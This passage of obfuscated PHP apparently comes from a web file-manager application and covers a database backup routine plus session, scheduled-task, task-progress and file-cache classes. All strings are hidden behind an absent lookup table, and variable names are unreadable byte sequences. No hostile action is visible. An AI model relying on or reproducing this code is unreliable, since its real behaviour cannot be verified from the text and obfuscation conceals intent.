$_SERVER[—ÌÒğš÷]; $à½öğª = Backup::get(); self::$io = $à½öğª[$øÁß°›[787]]; self::$name = $à½öğª[$øÁß°›[32]]; $•ÔÉ—ª¬ = new DbManage(); $ô÷Ğ‚“Š = $•ÔÉ—ª¬->dbType(); $‘Æ¸¤æ® = array($øÁß°›[812] => $ô÷Ğ‚“Š, $øÁß°›[813] => time()); Backup::set($‘Æ¸¤æ®); $öĞ¸³®‹ = $this->tmpFilesPath() . $øÁß°›[814] . self::$name . $øÁß°›[8]; del_dir($öĞ¸³®‹); mk_dir($öĞ¸³®‹); $È®¥¦‘ä = $ú‡šî’• = 0; $è¡Ò²º† = new Task($øÁß°›[815], $øÁß°›[816], 0, LNG($øÁß°›[817]) . $øÁß°›[818] . LNG($øÁß°›[819])); try { $Šâ½ŸƒÄ = $•ÔÉ—ª¬->db()->getTables(); } catch (Exception $“—»×‰ø) { $è¡Ò²º†->end(); return !1; } $Šâ½ŸƒÄ = array_diff($Šâ½ŸƒÄ, array($øÁß°›[820], $øÁß°›[821])); foreach ($Šâ½ŸƒÄ as $‡Íô·º¦) { $È®¥¦‘ä += $•ÔÉ—ª¬->model($‡Íô·º¦)->count(); } $è¡Ò²º†->task[$øÁß°›[822]] = $È®¥¦‘ä; $GLOBALS[$øÁß°›[823]] = self::$name; foreach ($Šâ½ŸƒÄ as $‡Íô·º¦) { $ÒÈÃöµş = $öĞ¸³®‹ . $‡Íô·º¦ . $øÁß°›[824]; $òğõ±£¬ = null; if ($‡Íô·º¦ == $øÁß°›[825] && (!isset($à½öğª[$øÁß°›[790]]) || $à½öğª[$øÁß°›[790]] == $øÁß°›[212])) { $òğõ±£¬ = self::$io; } $ú‡šî’• += $•ÔÉ—ª¬->sqlFromDb($‡Íô·º¦, $ÒÈÃöµş, $è¡Ò²º†, $òğõ±£¬); } unset($GLOBALS[$øÁß°›[823]]); $è¡Ò²º†->end(); if ($ú‡šî’• > $È®¥¦‘ä) { $È®¥¦‘ä = $ú‡šî’•; } $‘Æ¸¤æ® = array($øÁß°›[812] => $ô÷Ğ‚“Š, $øÁß°›[809] => 1, $øÁß°›[826] => $È®¥¦‘ä, $øÁß°›[827] => $ú‡šî’•, $øÁß°›[828] => time()); Backup::set($‘Æ¸¤æ®); if ($È®¥¦‘ä - $ú‡šî’• > 0) { $ˆƒ¾öôã = $øÁß°›[829]; if (stristr(I18n::getType(), $øÁß°›[830])) { $ˆƒ¾öôã = $øÁß°›[831]; } write_log(array($ˆƒ¾öôã, $‘Æ¸¤æ®), $øÁß°›[816]); return !1; } return !0; } private function tmpFilesPath() { $’ş­ŠŠÀ =& $_SERVER[—ÌÒğš÷]; $ØÒÁá»ı = TEMP_FILES; if ($GLOBALS[$’ş­ŠŠÀ[6]][$’ş­ŠŠÀ[89]][$’ş­ŠŠÀ[832]]) { $ØÒÁá»ı = $GLOBALS[$’ş­ŠŠÀ[6]][$’ş­ŠŠÀ[89]][$’ş­ŠŠÀ[832]]; if (!mk_dir($ØÒÁá»ı) || !is_writable($ØÒÁá»ı) || !IO::mkfile($ØÒÁá»ı . $’ş­ŠŠÀ[833])) { $ØÒÁá»ı = TEMP_FILES; } } return $ØÒÁá»ı; } } goto eå…°ëË·; fÚÏ÷Æ’ŠÙ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $èé¤ñ®Ø =& $_SERVER[—ÌÒğš÷]; static $ŒµÏæï‰ = false; if ($ŒµÏæï‰) { return $ŒµÏæï‰; } $œüÇ‡ÕÕ = $GLOBALS[$èé¤ñ®Ø[6]][$èé¤ñ®Ø[393]]; self::$sessionTime = $œüÇ‡ÕÕ[$èé¤ñ®Ø[1640]]; $¶Ê­Îˆ = isset($GLOBALS[$èé¤ñ®Ø[1641]]) ? $GLOBALS[$èé¤ñ®Ø[1641]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¶Ê­Îˆ)) { self::$sessionSign = Cookie::get($¶Ê­Îˆ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¶Ê­Îˆ, self::$sessionSign, self::$sessionTime); $òÙ´’‘Ã = $œüÇ‡ÕÕ[$èé¤ñ®Ø[1642]]; $‚¼Î¶¶ = $œüÇ‡ÕÕ[$òÙ´’‘Ã]; $÷Œ™ñÆ› = $œüÇ‡ÕÕ[$èé¤ñ®Ø[864]]; switch ($òÙ´’‘Ã) { case $èé¤ñ®Ø[21]: self::$handle = Model($èé¤ñ®Ø[865]); break; case $èé¤ñ®Ø[866]: self::$handle = new CacheRedis($‚¼Î¶¶, $÷Œ™ñÆ›); break; case $èé¤ñ®Ø[867]: self::$handle = new CacheMemcached($‚¼Î¶¶, $÷Œ™ñÆ›); break; case $èé¤ñ®Ø[214]: $‚¼Î¶¶[$èé¤ñ®Ø[84]] = $‚¼Î¶¶[$èé¤ñ®Ø[84]] . $èé¤ñ®Ø[1643]; self::$handle = new CacheFile($‚¼Î¶¶, $÷Œ™ñÆ›); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ŒµÏæï‰ = new self(); return $ŒµÏæï‰; } public static function getBySign($È³œ€¨–) { $¤ü„ Á‡ = self::$handle->get($È³œ€¨–); $¤ü„ Á‡ = unserialize($¤ü„ Á‡); return is_array($¤ü„ Á‡) ? $¤ü„ Á‡ : array(); } public static function setBySign($İ®Ú‹Î, $˜‡¯íÔ) { CacheLock::lock($İ®Ú‹Î); self::$handle->set($İ®Ú‹Î, serialize($˜‡¯íÔ), self::$sessionTime); CacheLock::unlock($İ®Ú‹Î); } public static function sign($¯ì‰…Èû = false) { if ($¯ì‰…Èû) { self::$sessionSign = $¯ì‰…Èû; } self::init(); return self::$sessionSign; } public static function set($—¬ÊüğÄ, $ÄÌ³Á¨Ï = false) { self::init(); if (is_array($—¬ÊüğÄ)) { foreach ($—¬ÊüğÄ as $™†èÑ‹› => $…öÏöı) { array_set_value(self::$data, $™†èÑ‹›, $…öÏöı); } } else { array_set_value(self::$data, $—¬ÊüğÄ, $ÄÌ³Á¨Ï); } self::setBySign(self::$sessionSign, self::$data); } public static function get($êé‘³İ÷ = false) { self::init(); if (!$êé‘³İ÷) { return self::$data; } return array_get_value(self::$data, $êé‘³İ÷); } public static function remove($¼Ç‡¬Ó³) { self::init(); unset(self::$data[$¼Ç‡¬Ó³]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[—ÌÒğš÷][870])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $‚ì¥Ò‰ =& $_SERVER[—ÌÒğš÷]; if (self::valueGet($‚ì¥Ò‰[786]) != $‚ì¥Ò‰[88]) { return; } if (self::valueGet($‚ì¥Ò‰[1644]) == $‚ì¥Ò‰[88]) { $İÁ¤Ğ = self::valueGet($‚ì¥Ò‰[1645]); if (time() - $İÁ¤Ğ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($‚ì¥Ò‰[1644], $‚ì¥Ò‰[88]); self::log($‚ì¥Ò‰[1646] . ACTION . $‚ì¥Ò‰[1647]); Hook::bind($‚ì¥Ò‰[1648], $‚ì¥Ò‰[1649]); $˜¡·÷³Ú = 0; while (!0) { self::cacheClear(); if (self::valueGet($‚ì¥Ò‰[786]) != $‚ì¥Ò‰[88]) { self::valueSet($‚ì¥Ò‰[1644], $‚ì¥Ò‰[212]); self::log($‚ì¥Ò‰[1650]); die; } $ğ®˜Òê„ = time(); if ($ğ®˜Òê„ - $˜¡·÷³Ú >= 60) { self::valueSet(array($‚ì¥Ò‰[1644] => $‚ì¥Ò‰[88], $‚ì¥Ò‰[1645] => $ğ®˜Òê„), !1); $˜¡·÷³Ú = $ğ®˜Òê„; } if (!file_exists(USER_SYSTEM . $‚ì¥Ò‰[1651])) { self::valueSet(array($‚ì¥Ò‰[1644] => $‚ì¥Ò‰[212], $‚ì¥Ò‰[786] => $‚ì¥Ò‰[212]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $îèŞ×½Ù =& $_SERVER[—ÌÒğš÷]; http_close(); $GLOBALS[$îèŞ×½Ù[1652]] = 1; $_SERVER[$îèŞ×½Ù[1653]] = $îèŞ×½Ù[1654]; $_COOKIE = array(); $GLOBALS[$îèŞ×½Ù[536]] = 1; $GLOBALS[$îèŞ×½Ù[1655]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Ş«æ–š =& $_SERVER[—ÌÒğš÷]; http_close(); self::valueSet($Ş«æ–š[786], $Ş«æ–š[212]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Ş«æ–š[1644] => $Ş«æ–š[212], $Ş«æ–š[786] => $Ş«æ–š[88]), !1); } public static function taskSwitch() { $—ë˜ Ñ¦ =& $_SERVER[—ÌÒğš÷]; $Ü«ªÂŞı = self::valueGet($—ë˜ Ñ¦[786]) == $—ë˜ Ñ¦[88] ? $—ë˜ Ñ¦[212] : $—ë˜ Ñ¦[88]; self::valueSet($—ë˜ Ñ¦[786], $Ü«ªÂŞı); } public static function shutdownEvent() { $èåĞêà  =& $_SERVER[—ÌÒğš÷]; self::valueSet($èåĞêà [1644], $èåĞêà [212]); self::log($èåĞêà [1656]); } public static function config($Š‡è¡®‡, $ª¤üĞš­) { self::valueSet($_SERVER[—ÌÒğš÷][786], $Š‡è¡®‡); } private static function taskRunAll() { $Š¦¾Óò =& $_SERVER[—ÌÒğš÷]; $¢šˆ¦Œ° = timeFloat(); $îÇ¶Ñµ² = Model($Š¦¾Óò[1657])->listData(); $×‘œÕà = count($îÇ¶Ñµ²); for ($º‡ğÃ’º = 0; $º‡ğÃ’º < $×‘œÕà; $º‡ğÃ’º++) { $«¥Ï¼ëş = $îÇ¶Ñµ²[$º‡ğÃ’º]; if (!$«¥Ï¼ëş[$Š¦¾Óò[443]] || $«¥Ï¼ëş[$Š¦¾Óò[1658]] != $Š¦¾Óò[88]) { continue; } if (!self::taskTimeCheck($«¥Ï¼ëş)) { continue; } self::taskRun($«¥Ï¼ëş); } Hook::trigger($Š¦¾Óò[1659]); self::taskQueueRun($¢šˆ¦Œ°); } private static function taskQueueRun($¿ˆæ¾Ôë) { $ı˜œÜÂÕ = 10; while (!0) { $ïÙÍïÕ· = TaskQueue::run(); if ($ïÙÍïÕ· === !1) { break; } if (timeFloat() - $¿ˆæ¾Ôë >= $ı˜œÜÂÕ) { break; } } } private static function taskTimeCheck($Ë×Ã›á) { $Ì¬Çí’  =& $_SERVER[—ÌÒğš÷]; $ÉâöŸâ = json_decode($Ë×Ã›á[$Ì¬Çí’ [194]], !0); $‡ä¬¢–î = intval($Ë×Ã›á[$Ì¬Çí’ [1645]]); $…¦ñ¶õñ = strtotime($Ì¬Çí’ [1660] . $ÉâöŸâ[$Ì¬Çí’ [1661]] . $Ì¬Çí’ [1662]) - strtotime($Ì¬Çí’ [1663]); $î–Ï¨¤­ = time() - strtotime(date($Ì¬Çí’ [1664]) . $Ì¬Çí’ [1665]); $Ú‰•ˆĞé = $î–Ï¨¤­ >= $…¦ñ¶õñ && $î–Ï¨¤­ <= $…¦ñ¶õñ + 3600; switch ($ÉâöŸâ[$Ì¬Çí’ [33]]) { case $Ì¬Çí’ [1666]: if (time() - $‡ä¬¢–î < 3600 * 24 * 30) { return !1; } if ($ÉâöŸâ[$Ì¬Çí’ [1666]] == date($Ì¬Çí’ [1667]) && $Ú‰•ˆĞé) { return !0; } break; case $Ì¬Çí’ [1668]: if (time() - $‡ä¬¢–î < 3600 * 24 * 7) { return !1; } $ò„–÷¾ = date($Ì¬Çí’ [1669]) == 0 ? 7 : date($Ì¬Çí’ [1669]); if ($ÉâöŸâ[$Ì¬Çí’ [1668]] == $ò„–÷¾ && $Ú‰•ˆĞé) { return !0; } break; case $Ì¬Çí’ [1661]: if (time() - $‡ä¬¢–î < 3600 * 24) { return !1; } if ($Ú‰•ˆĞé) { return !0; } break; case $Ì¬Çí’ [1670]: if (time() - $‡ä¬¢–î >= floatval($ÉâöŸâ[$Ì¬Çí’ [1670]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ùöèïó­ =& $_SERVER[—ÌÒğš÷]; static $ú¡²”ç¯ = 0; $ÒìèêóÛ = 300; if (!$ú¡²”ç¯) { $ú¡²”ç¯ = time(); } if (time() - $ú¡²”ç¯ < $ÒìèêóÛ) { return; } $ú¡²”ç¯ = time(); $„Á…“ÈÊ = Model($Ùöèïó­[546])->db($Ùöèïó­[12]); if ($„Á…“ÈÊ) { $„Á…“ÈÊ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ùöèïó­[1671], $Ùöèïó­[1672]); die; } } public static function taskRun($ÉŒ³‰éğ) { $®Ñ÷º¦¹ =& $_SERVER[—ÌÒğš÷]; self::log($®Ñ÷º¦¹[1673] . $ÉŒ³‰éğ[$®Ñ÷º¦¹[443]] . $®Ñ÷º¦¹[1674] . $ÉŒ³‰éğ[$®Ñ÷º¦¹[32]] . $®Ñ÷º¦¹[1675] . $ÉŒ³‰éğ[$®Ñ÷º¦¹[1676]]); Model($®Ñ÷º¦¹[1657])->run($ÉŒ³‰éğ[$®Ñ÷º¦¹[443]]); $ÄËñù¡¯ = timeFloat(); $œëğ¤‹‡ = $®Ñ÷º¦¹[12]; switch ($ÉŒ³‰éğ[$®Ñ÷º¦¹[33]]) { case $®Ñ÷º¦¹[351]: $™êÅ¶¹£ = url_request($ÉŒ³‰éğ[$®Ñ÷º¦¹[1676]], $®Ñ÷º¦¹[245], !1, !1, !1, !1, 10); if ($™êÅ¶¹£[$®Ñ÷º¦¹[786]]) { $œëğ¤‹‡ = strlen($™êÅ¶¹£[$®Ñ÷º¦¹[1246]]); } break; case $®Ñ÷º¦¹[244]: $œëğ¤‹‡ = Hook::apply($ÉŒ³‰éğ[$®Ñ÷º¦¹[1676]]); default: break; } Model($®Ñ÷º¦¹[1677])->add(array($®Ñ÷º¦¹[1678] => $®Ñ÷º¦¹[12], $®Ñ÷º¦¹[1679] => $®Ñ÷º¦¹[212], $®Ñ÷º¦¹[33] => $®Ñ÷º¦¹[1680] . $ÉŒ³‰éğ[$®Ñ÷º¦¹[443]], $®Ñ÷º¦¹[1681] => json_encode(array($®Ñ÷º¦¹[32] => $ÉŒ³‰éğ[$®Ñ÷º¦¹[32]], $®Ñ÷º¦¹[1682] => timeFloat() - $ÄËñù¡¯, $®Ñ÷º¦¹[337] => $œëğ¤‹‡)))); $ìõÑºŒü = $œëğ¤‹‡ ? $®Ñ÷º¦¹[1683] . $œëğ¤‹‡ : $®Ñ÷º¦¹[12]; self::log($®Ñ÷º¦¹[1684] . $ÉŒ³‰éğ[$®Ñ÷º¦¹[443]] . $®Ñ÷º¦¹[165] . $ìõÑºŒü); return !0; } public static function valueGet($¼‘äâˆ‡) { $ÑëºÚ°­ =& $_SERVER[—ÌÒğš÷]; $®ÌåÙî = $ÑëºÚ°­[1685]; $•¾ñê¡» = Model($ÑëºÚ°­[476])->get($¼‘äâˆ‡, $®ÌåÙî); if (is_null($•¾ñê¡»)) { Model($ÑëºÚ°­[476])->set($ÑëºÚ°­[786], $ÑëºÚ°­[88], $®ÌåÙî); Model($ÑëºÚ°­[476])->set($ÑëºÚ°­[1644], $ÑëºÚ°­[212], $®ÌåÙî); $•¾ñê¡» = Model($ÑëºÚ°­[476])->get($¼‘äâˆ‡, $®ÌåÙî); } return $•¾ñê¡»; } private static function valueSet($¦‰ïÉ¯, $ «•„¹µ) { $ï–†èµ€ =& $_SERVER[—ÌÒğš÷]; $Àñ Şğà = $ï–†èµ€[1686]; CacheLock::lock($Àñ Şğà); $÷¾¡ˆ›„ = Model($ï–†èµ€[476])->set($¦‰ïÉ¯, $ «•„¹µ, $ï–†èµ€[1685]); CacheLock::unlock($Àñ Şğà); return $÷¾¡ˆ›„; } protected static function log($Ò×â†ë³) { write_log($Ò×â†ë³, $_SERVER[—ÌÒğš÷][1672]); } private static function cacheClear() { $Âé»Ê „ =& $_SERVER[—ÌÒğš÷]; Cache::clearMemory(Model($Âé»Ê „[476])->cacheKey($Âé»Ê „[1685])); Cache::clearMemory(Model($Âé»Ê „[476])->cacheKey($Âé»Ê „[1687])); Model($Âé»Ê „[1657])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\x72\x75\156\x6e\151\x6e\147"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($óğàÙ¹Š, $÷­íª‘ = '', $ÇÈß¬èª = 0, $‚ïê’÷ = '') { $şÜ™‹ñè =& $_SERVER[—ÌÒğš÷]; if (self::get($óğàÙ¹Š)) { return; } $this->task = array($şÜ™‹ñè[443] => $óğàÙ¹Š, $şÜ™‹ñè[1688] => USER_ID, $şÜ™‹ñè[1585] => $‚ïê’÷, $şÜ™‹ñè[494] => $şÜ™‹ñè[12], $şÜ™‹ñè[33] => $÷­íª‘, $şÜ™‹ñè[1108] => $şÜ™‹ñè[12], $şÜ™‹ñè[822] => $ÇÈß¬èª, $şÜ™‹ñè[1689] => 0, $şÜ™‹ñè[1690] => 0, $şÜ™‹ñè[1691] => 0, $şÜ™‹ñè[1692] => timeFloat(), $şÜ™‹ñè[1693] => 0, $şÜ™‹ñè[1694] => 0, $şÜ™‹ñè[1695] => 0, $şÜ™‹ñè[1696] => 0, $şÜ™‹ñè[786] => $şÜ™‹ñè[1644]); $GLOBALS[$şÜ™‹ñè[1697]] = 1; Hook::bind($şÜ™‹ñè[1648], array($this, $şÜ™‹ñè[1698])); Hook::bind($şÜ™‹ñè[1699], array($this, $şÜ™‹ñè[1700])); $this->startAfter(); Hook::trigger($şÜ™‹ñè[1701], $this->task); $this->task[$şÜ™‹ñè[1694]] = timeFloat(); } public function end($íâûæõ¼ = '') { $‚ãâƒ¸… =& $_SERVER[—ÌÒğš÷]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$‚ãâƒ¸…[1694]]) { self::valueSet($this->task[$‚ãâƒ¸…[443]], !1); } $this->isEnd = !0; if ($íâûæõ¼) { $this->task[$‚ãâƒ¸…[494]] = $íâûæõ¼; } self::log($‚ãâƒ¸…[1702] . $this->task[$‚ãâƒ¸…[443]] . $‚ãâƒ¸…[1703] . sprintf($‚ãâƒ¸…[895], timeFloat() - $this->task[$‚ãâƒ¸…[1692]]) . $‚ãâƒ¸…[1704]); Hook::unbind($‚ãâƒ¸…[1648], array($this, $‚ãâƒ¸…[1698])); Hook::unbind($‚ãâƒ¸…[1699], array($this, $‚ãâƒ¸…[1700])); $this->endAfter(); $˜ş¡İÑ = $this->task; $this->task = !1; Hook::trigger($‚ãâƒ¸…[1705], $˜ş¡İÑ); } public function update($š†Î¿Íœ = 0, $­Ä«©“Û = false) { $ÁõïŞÈç =& $_SERVER[—ÌÒğš÷]; $šèÇïãÛ =& $this->task; if (!$šèÇïãÛ) { return; } $šèÇïãÛ[$ÁõïŞÈç[1689]] += $š†Î¿Íœ; $šèÇïãÛ[$ÁõïŞÈç[1693]] = timeFloat(); if ($šèÇïãÛ[$ÁõïŞÈç[822]]) { if ($šèÇïãÛ[$ÁõïŞÈç[822]] < $šèÇïãÛ[$ÁõïŞÈç[1689]]) { $šèÇïãÛ[$ÁõïŞÈç[822]] = $šèÇïãÛ[$ÁõïŞÈç[1689]]; } $Ÿúõ™„Ó = timeFloat() - $šèÇïãÛ[$ÁõïŞÈç[1692]] - $šèÇïãÛ[$ÁõïŞÈç[1695]]; if ($Ÿúõ™„Ó <= 0) { $Ÿúõ™„Ó = 0.001; } $šèÇïãÛ[$ÁõïŞÈç[1690]] = $šèÇïãÛ[$ÁõïŞÈç[1689]] / $šèÇïãÛ[$ÁõïŞÈç[822]]; $šèÇïãÛ[$ÁõïŞÈç[1691]] = $šèÇïãÛ[$ÁõïŞÈç[1689]] / $Ÿúõ™„Ó; if ($šèÇïãÛ[$ÁõïŞÈç[1690]] > 0) { $šèÇïãÛ[$ÁõïŞÈç[1696]] = $Ÿúõ™„Ó * (1 - $šèÇïãÛ[$ÁõïŞÈç[1690]]) / $šèÇïãÛ[$ÁõïŞÈç[1690]]; } $šèÇïãÛ[$ÁõïŞÈç[1696]] = $šèÇïãÛ[$ÁõïŞÈç[1696]] <= 0 ? 0 : $šèÇïãÛ[$ÁõïŞÈç[1696]]; } $this->updateAfter(); $©Ò®àÊÄ = 0.2; if (timeFloat() - $šèÇïãÛ[$ÁõïŞÈç[1694]] < $©Ò®àÊÄ && !$­Ä«©“Û) { return; } $»“˜•Èà = self::get($šèÇïãÛ[$ÁõïŞÈç[443]]); $Ğ„‡¯ = $»“˜•Èà[$ÁõïŞÈç[786]]; if ($Ğ„‡¯ == self::STATYS_KILL) { $ÆåÅ³Ö = array($ÁõïŞÈç[1706] => LNG($ÁõïŞÈç[1707]), $ÁõïŞÈç[1256] => !1); Cache::set($ÁõïŞÈç[1708] . $this->task[$ÁõïŞÈç[443]], $ÆåÅ³Ö, 30); $this->onKill(); $this->end(); die; } else { if ($Ğ„‡¯ == self::STATYS_STOP) { $º½È¯´â = 2; $»“˜•Èà[$ÁõïŞÈç[1695]] += $º½È¯´â; self::valueSet($šèÇïãÛ[$ÁõïŞÈç[443]], $»“˜•Èà); sleep($º½È¯´â); $this->update(); return; } } $šèÇïãÛ[$ÁõïŞÈç[786]] = $Ğ„‡¯ ? $Ğ„‡¯ : $šèÇïãÛ[$ÁõïŞÈç[786]]; $šèÇïãÛ[$ÁõïŞÈç[1695]] = $»“˜•Èà[$ÁõïŞÈç[1695]] ? $»“˜•Èà[$ÁõïŞÈç[1695]] : 0; $šèÇïãÛ[$ÁõïŞÈç[1694]] = timeFloat(); Hook::trigger($ÁõïŞÈç[1709], $šèÇïãÛ); self::valueSet($šèÇïãÛ[$ÁõïŞÈç[443]], $šèÇïãÛ); } public function onKillSet($üı×Î¬±, $Ğ©š•˜ñ = array()) { $this->onKillCall = array($üı×Î¬±, $Ğ©š•˜ñ); } public function onKill() { $Ë’¬‹Ú« =& $_SERVER[—ÌÒğš÷]; self::log($Ë’¬‹Ú«[1702] . $this->task[$Ë’¬‹Ú«[443]] . $Ë’¬‹Ú«[1710]); Hook::trigger($Ë’¬‹Ú«[1711], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ğ¸”¸ã±) { $¨ˆÄ®·Ö =& $_SERVER[—ÌÒğš÷]; Cache::set($¨ˆÄ®·Ö[1708] . $this->task[$¨ˆÄ®·Ö[443]], $ğ¸”¸ã±, 60); return $ğ¸”¸ã±; } public static function get($Á­ÕÛÍ¹) { $†Ø÷ï¨Ë =& $_SERVER[—ÌÒğš÷]; $„ØÔ¼Éê = self::valueGet($Á­ÕÛÍ¹); if (is_array($„ØÔ¼Éê) && $„ØÔ¼Éê[$†Ø÷ï¨Ë[1712]]) { $®ìûÔ‰¤ = ActionApply($„ØÔ¼Éê[$†Ø÷ï¨Ë[1712]], array($„ØÔ¼Éê)); $„ØÔ¼Éê = is_array($®ìûÔ‰¤) ? $®ìûÔ‰¤ : $„ØÔ¼Éê; } return $„ØÔ¼Éê; } public static function listData() { $ì éÊÜ” = self::valueGet(); return array_sort_by($ì éÊÜ”, $_SERVER[—ÌÒğš÷][1692], !0); } public static function kill($±õë’®Ù) { return self::changeStatus($±õë’®Ù, self::STATYS_KILL); } public static function stop($Â¨‹šŞƒ) { return self::changeStatus($Â¨‹šŞƒ, self::STATYS_STOP); } public static function restart($™èçÎµ´) { return self::changeStatus($™èçÎµ´, self::STATYS_RUNNING); } public static function killAll() { $şõ íå± =& $_SERVER[—ÌÒğš÷]; $Ñ–ìÑ‘ú = self::listData(); foreach ($Ñ–ìÑ‘ú as $æ±Ğ×ƒµ) { self::kill($æ±Ğ×ƒµ[$şõ íå±[443]]); } sleep(2); foreach ($Ñ–ìÑ‘ú as $æ±Ğ×ƒµ) { self::valueSet($æ±Ğ×ƒµ[$şõ íå±[443]], !1); } } private static function changeStatus($‹À¤•‡, $ıÊÊ£Şá) { $©ıàº¯ =& $_SERVER[—ÌÒğš÷]; $İ¥ğ‡ƒ = self::valueGet($‹À¤•‡); if (!$İ¥ğ‡ƒ) { return !1; } $İ¥ğ‡ƒ[$©ıàº¯[786]] = $ıÊÊ£Şá; self::valueSet($‹À¤•‡, $İ¥ğ‡ƒ); self::log($©ıàº¯[1713] . $İ¥ğ‡ƒ[$©ıàº¯[443]] . $©ıàº¯[1714] . $ıÊÊ£Şá); return !0; } public static function valueGet($Œç¡ÜÓ = false) { $¤İ‚•› =& $_SERVER[—ÌÒğš÷]; if ($Œç¡ÜÓ) { $˜’ùæÜë = Model($¤İ‚•›[488])->where(array($¤İ‚•›[94] => $Œç¡ÜÓ, $¤İ‚•›[33] => $¤İ‚•›[1115]))->find(); return $˜’ùæÜë ? json_decode($˜’ùæÜë[$¤İ‚•›[418]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($·“ô—âÕ = false) { $Ã³àÜ Æ =& $_SERVER[—ÌÒğš÷]; $½ÄĞé¨ = array($Ã³àÜ Æ[33] => $Ã³àÜ Æ[1115]); if ($·“ô—âÕ) { $½ÄĞé¨[$Ã³àÜ Æ[1688]] = $·“ô—âÕ; } $¥™­‰È­ = Model($Ã³àÜ Æ[488])->where($½ÄĞé¨)->select(); $¥™­‰È­ = $¥™­‰È­ ? $¥™­‰È­ : array(); foreach ($¥™­‰È­ as $ßóãñ => $Ö”í¿Ûš) { $¥™­‰È­[$ßóãñ] = json_decode($Ö”í¿Ûš[$Ã³àÜ Æ[418]], !0); } return $¥™­‰È­; } public static function valueSet($Ãâ‡ÕÏ£, $×ä­ùÇ) { $ô¬ÉÏïø =& $_SERVER[—ÌÒğš÷]; if (!$×ä­ùÇ) { return Model($ô¬ÉÏïø[488])->where(array($ô¬ÉÏïø[94] => $Ãâ‡ÕÏ£, $ô¬ÉÏïø[33] => $ô¬ÉÏïø[1115]))->delete(); } $‘ãåÒç§ = json_encode($×ä­ùÇ); if (!$‘ãåÒç§) { ob_start(); var_dump($×ä­ùÇ); $†üÉ„ = ob_get_clean(); self::log($ô¬ÉÏïø[1715] . json_encode_force($†üÉ„)); } if (!$Ãâ‡ÕÏ£ || !$×ä­ùÇ[$ô¬ÉÏïø[443]]) { return !1; } $ƒøãŸ³İ = array($ô¬ÉÏïø[33] => $ô¬ÉÏïø[1115], $ô¬ÉÏïø[1688] => USER_ID, $ô¬ÉÏïø[94] => $Ãâ‡ÕÏ£, $ô¬ÉÏïø[418] => $‘ãåÒç§); $Ü­ÆÄ¥É = $ô¬ÉÏïø[1716]; CacheLock::lock($Ü­ÆÄ¥É); Model($ô¬ÉÏïø[488])->add($ƒøãŸ³İ, array(), !0); CacheLock::unlock($Ü­ÆÄ¥É); } public static function log($”Üò²Íã) { if (!GLOBAL_DEBUG) { return; } write_log($”Üò²Íã, $_SERVER[—ÌÒğš÷][1717]); } } goto E¹´ï‡Ûº; D¨ÒöãÒøŠ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ŠÅ±ïÅú, $ÄÌÄò§’) { $ş×ş‰’Ë =& $_SERVER[—ÌÒğš÷]; $this->cachePath = $ŠÅ±ïÅú[$ş×ş‰’Ë[84]]; $this->prefix = $ş×ş‰’Ë[871]; $this->cacheTime = $ÄÌÄò§’; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¼Õş¤äß) { $°ŞÂ¸šÑ =& $_SERVER[—ÌÒğš÷]; $¼Õş¤äß = str_replace(array($°ŞÂ¸šÑ[872], $°ŞÂ¸šÑ[97], $°ŞÂ¸šÑ[73]), $°ŞÂ¸šÑ[873], $¼Õş¤äß); return $this->cachePath . $°ŞÂ¸šÑ[874] . $¼Õş¤äß . $°ŞÂ¸šÑ[875]; } public function set($ÖÒ°˜Õ±, $âù…ºôè, $ø’ò±‰· = false) { $ø’ò±‰· = $ø’ò±‰· ? $ø’ò±‰· : $this->cacheTime; $å¸©¿ÆË = $this->getFile($ÖÒ°˜Õ±); if (file_put_contents($å¸©¿ÆË, $this->prefix . $âù…ºôè, LOCK_EX)) { @touch($å¸©¿ÆË, intval(time() + $ø’ò±‰·)); clearstatcache(); return !0; } @unlink($å¸©¿ÆË); return !1; } public function get($åÂßØÊ¼) { $ŞÃáü†¼ = $this->getFile($åÂßØÊ¼); if (file_exists($ŞÃáü†¼) && filemtime($ŞÃáü†¼) < time()) { @unlink($ŞÃáü†¼); return !1; } $ÖÖğñşø = @file_get_contents($ŞÃáü†¼); return substr($ÖÖğñşø, strlen($this->prefix)); } public function remove($äŸş¥ÛÕ) { $ú÷Ñå×¢ = $this->getFile($äŸş¥ÛÕ); return @unlink($ú÷Ñå×¢); } public function deleteAll() { $¹ÚŒí¡ï =& $_SERVER[—ÌÒğš÷]; $ÉÂòÍ¿Ê = scandir($this->cachePath); foreach ($ÉÂòÍ¿Ê as $Şüô‹¡) { $ó‡şæ› = $this->cachePath . $Şüô‹¡; if (strpos($ó‡şæ›, $¹ÚŒí¡ï[875]) && strpos($ó‡şæ›, $¹ÚŒí¡ï[876])) { @unlink($ó‡şæ›); } } } public function clearTimeout() { 